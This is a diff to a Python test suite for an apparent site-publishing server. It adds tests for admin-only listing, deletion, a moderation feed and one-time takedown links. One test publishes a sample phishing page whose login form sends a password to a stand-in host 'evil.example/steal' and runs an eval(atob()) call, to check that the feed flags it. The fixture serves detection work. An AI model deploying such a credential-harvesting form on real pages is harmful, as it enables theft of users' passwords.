@@ -16,7 +16,7 @@ import urllib.error
 import urllib.request
 
 APP = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "app")
-KEY, KEY2 = "k" * 40, "q" * 40
+KEY, KEY2, ADMIN = "k" * 40, "q" * 40, "r" * 40
 
 
 class NoRedirect(urllib.request.HTTPRedirectHandler):
@@ -37,7 +37,7 @@ class Server(unittest.TestCase):
             s.bind(("127.0.0.1", 0))
             cls.port = s.getsockname()[1]
         cls.base = f"http://127.0.0.1:{cls.port}"
-        env = {**os.environ, "DATA_DIR": cls.tmp.name, "PORT": str(cls.port), "MCP_KEYS": f"ada:{KEY},bob:{KEY2},short:abc",
+        env = {**os.environ, "DATA_DIR": cls.tmp.name, "PORT": str(cls.port), "MCP_KEYS": f"ada:{KEY},bob:{KEY2},root:{ADMIN},short:abc", "ADMIN_AGENTS": "root,nobody",
                "PUBLIC_URL": "https://pages.example.com", "MAX_SITE_MB": "1", "MAX_FILES": "5", **cls.EXTRA}
         cls.proc = subprocess.Popen([sys.executable, "server.py"], cwd=APP, env=env, stdout=subprocess.DEVNULL)
         for _ in range(100):
@@ -185,6 +185,68 @@ class Server(unittest.TestCase):
             self.call("publish_site", {"html": "x"}, key=None)
         self.assertEqual(e.exception.code, 401)
         self.assertNotIn(b"Anyone can publish", self.http("/")[1])
+
+    def test_only_an_admin_sees_every_site(self):
+        tools = lambda key: {t["name"] for t in self.rpc_list(key)}
+        self.assertIn("list_all_sites", tools(ADMIN))
+        self.assertNotIn("list_all_sites", tools(KEY))
+        body = json.dumps({"jsonrpc": "2.0", "id": 1, "method": "tools/call", "params": {"name": "list_all_sites", "arguments": {}}}).encode()
+        req = urllib.request.Request(self.base + "/mcp", body, {"Authorization": f"Bearer {KEY}"})
+        self.assertIn("Unknown tool", json.load(urllib.request.urlopen(req))["error"]["message"])
+        a = self.ok("publish_site", {"html": "from ada"})["site"]
+        b = self.ok("publish_site", {"html": "from bob"}, KEY2)["site"]
+        listed = {x["site"]: x for x in self.ok("list_all_sites", key=ADMIN)["sites"]}
+        self.assertEqual((listed[a]["owner"], listed[b]["owner"]), ("ada", "bob"))
+        self.assertIn("signals:", listed[a]["review"])
+
+    def test_an_admin_can_take_any_site_down(self):
+        s = self.ok("publish_site", {"html": "bob's"}, KEY2)["site"]
+        self.ok("delete_site", {"site": s}, ADMIN)
+        self.assertEqual(self.http(f"/{s}/")[0], 404)
+
+    def feed(self, key):
+        return self.http("/moderation/feed", {"Authorization": f"Bearer {key}"} if key else {})
+
+    def test_the_feed_needs_an_admin_key_and_flags_what_matters(self):
+        self.assertEqual(self.feed(None)[0], 401)
+        self.assertEqual(self.feed(KEY)[0], 401)
+        page = '<title>Log in</title><form action="https://evil.example/steal"><input type="password"></form><script>eval(atob("x"))</script>'
+        s = self.ok("publish_site", {"html": page, "site": "phish-test"})["site"]
+        code, body, headers = self.feed(ADMIN)
+        text = body.decode()
+        self.assertEqual(code, 200)
+        self.assertEqual(headers["Cache-Control"], "no-store")
+        block = text[text.index(f"site {s} "):].split("\n\n")[0]
+        self.assertIn("password field", block)
+        self.assertIn("form sends to evil.example", block)
+        self.assertIn("obfuscation-like calls x2", block)
+        self.assertIn("title: Log in", block)
+        self.assertEqual(self.feed(ADMIN)[1], body, "the same sites give the same feed, so a watcher can hash it")
+
+    def test_a_take_down_link_asks_first_and_works_once(self):
+        s = self.ok("publish_site", {"html": "<h1>bad</h1>"}, KEY2)["site"]
+        text = self.feed(ADMIN)[1].decode()
+        link = re.search(rf"https://pages\.example\.com(/moderation/takedown/{s}/[0-9a-f]{{32}})", text).group(1)
+        code, body, _ = self.http(link)
+        self.assertEqual(code, 200)
+        self.assertIn(b"<form method=\"post\">", body)
+        self.assertEqual(self.http(f"/{s}/")[0], 200, "opening the link, as a chat preview does, must not take it down")
+        self.assertEqual(self.post(link, b"")[0], 200)
+        self.assertEqual(self.http(f"/{s}/")[0], 404)
+        self.assertEqual(self.post(link, b"")[0], 404)
+
+    def test_a_take_down_link_dies_when_the_site_changes(self):
+        s = self.ok("publish_site", {"html": "v1"})["site"]
+        link = re.search(rf"(/moderation/takedown/{s}/[0-9a-f]{{32}})", self.feed(ADMIN)[1].decode()).group(1)
+        time.sleep(1.1)
+        self.ok("publish_site", {"html": "v2", "site": s})
+        self.assertEqual(self.post(link, b"")[0], 404)
+        self.assertEqual(self.post(f"/moderation/takedown/{s}/{'0' * 32}", b"")[0], 404)
+
+    def rpc_list(self, key):
+        body = json.dumps({"jsonrpc": "2.0", "id": 1, "method": "tools/list"}).encode()
+        req = urllib.request.Request(self.base + "/mcp", body, {"Authorization": f"Bearer {key}"})
+        return json.load(urllib.request.urlopen(req))["result"]["tools"]
 
     def test_mcp_handshake(self):
         body = json.dumps({"jsonrpc": "2.0", "id": 1, "method": "tools/list"}).encode()
